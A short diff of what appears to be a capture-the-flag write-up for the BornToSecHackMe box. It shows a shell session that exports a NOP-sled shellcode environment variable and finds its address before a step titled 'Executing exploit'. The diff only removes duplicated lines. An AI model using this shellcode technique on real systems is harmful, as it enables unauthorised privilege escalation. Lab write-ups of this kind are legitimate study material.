@@ -50,10 +50,6 @@ zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\
 zaz@BornToSecHackMe:~$ ./env SHELLCODE
 SHELLCODE: 0xbffff49b
 
-
-
-zaz@BornToSecHackMe:~$ ./env SHELLCODE
-SHELLCODE: 0xbffff49b
 ```
 
  3. Executing exploit
